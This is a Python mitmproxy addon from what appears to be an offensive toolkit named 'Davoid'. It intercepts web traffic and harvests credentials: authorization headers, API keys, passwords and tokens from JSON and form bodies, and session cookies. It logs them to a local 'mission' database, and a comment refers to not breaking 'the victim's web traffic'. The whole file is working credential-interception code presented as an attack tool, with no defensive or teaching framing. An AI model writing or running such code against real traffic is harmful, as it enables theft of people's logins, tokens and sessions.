import json
import urllib.parse
from mitmproxy import http
import sys
import os

# ==============================================================================
# 1. BULLETPROOF PATH FIX
# We must inject the paths BEFORE any local imports occur.
# ==============================================================================
DAVOID_OPT_PATH = "/opt/davoid"
if DAVOID_OPT_PATH not in sys.path:
    sys.path.insert(0, DAVOID_OPT_PATH)

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, '..'))
if PARENT_DIR not in sys.path:
    sys.path.insert(0, PARENT_DIR)

# ==============================================================================
# 2. SAFE IMPORTS
# ==============================================================================
try:
    from core.database import db
except ImportError as e:
    print(f"\n[!] WARNING: Could not import Davoid Mission Database: {e}")
    print("[!] Proxy will continue running, but credentials will only print to console, not save to DB.\n")

    # Create a dummy DB object to prevent crashes if the import fails
    class DummyDB:
        def log(self, module, target, data, severity):
            pass
    db = DummyDB()


# ==============================================================================
# 3. INTERCEPTOR ENGINE
# ==============================================================================

class DavoidInterceptor:
    def __init__(self):
        # High-value parameter keys that trigger a database log
        self.sensitive_keys = ["password", "passwd", "pwd", "token",
                               "api_key", "secret", "auth", "access_token", "client_secret"]

    def request(self, flow: http.HTTPFlow):
        """Deep Packet Inspection on outgoing requests."""
        req = flow.request
        target = req.pretty_host
        url = req.pretty_url

        # 1. CATCH AUTHORIZATION HEADERS
        auth_header = req.headers.get(
            "Authorization", "") or req.headers.get("X-API-Key", "")
        if auth_header:
            db.log(
                module="Burp-Proxy",
                target=target,
                data=f"Intercepted Auth Header:\n{auth_header}\nEndpoint: {url}",
                severity="CRITICAL"
            )

        # 2. PARSE POST/PUT/PATCH BODIES
        if req.method in ["POST", "PUT", "PATCH"] and req.content:
            content_type = req.headers.get("Content-Type", "").lower()
            captured_creds = []

            try:
                # Handle JSON Payloads
                if "application/json" in content_type:
                    body = json.loads(req.get_text(strict=False))
                    self._extract_json_creds(body, captured_creds)

                # Handle Standard Web Forms
                elif "application/x-www-form-urlencoded" in content_type:
                    parsed_form = urllib.parse.parse_qs(
                        req.get_text(strict=False))
                    for key, values in parsed_form.items():
                        if any(s_key in key.lower() for s_key in self.sensitive_keys):
                            captured_creds.append(f"{key}: {values[0]}")

                # Log to DB if we found anything
                if captured_creds:
                    cred_string = "\n".join(captured_creds)
                    db.log(
                        module="Burp-Proxy",
                        target=target,
                        data=f"Harvested Credentials at {url}:\n{cred_string}",
                        severity="CRITICAL"
                    )
            except Exception:
                pass  # Fail silently so we don't break the victim's web traffic

    def response(self, flow: http.HTTPFlow):
        """Inspection of incoming responses."""
        res = flow.response
        target = flow.request.pretty_host

        # 3. CATCH AUTHENTICATION COOKIES
        if "set-cookie" in res.headers:
            for cookie in res.headers.get_all("set-cookie"):
                cookie_lower = cookie.lower()
                if any(x in cookie_lower for x in ["session", "auth", "token", "jwt"]):
                    # Strip massive cookies to just the important bits for the log
                    clean_cookie = cookie.split(';')[0]
                    db.log(
                        module="Burp-Proxy",
                        target=target,
                        data=f"Server assigned Auth Cookie:\n{clean_cookie}",
                        severity="HIGH"
                    )

    def _extract_json_creds(self, json_data, output_list):
        """Recursive function to find passwords nested deep inside JSON APIs."""
        if isinstance(json_data, dict):
            for key, value in json_data.items():
                if any(s_key in key.lower() for s_key in self.sensitive_keys):
                    # Ensure we don't log massive nested objects, just strings/ints
                    if isinstance(value, (str, int, float, bool)):
                        output_list.append(f"{key}: {value}")
                else:
                    self._extract_json_creds(value, output_list)
        elif isinstance(json_data, list):
            for item in json_data:
                self._extract_json_creds(item, output_list)


addons = [DavoidInterceptor()]
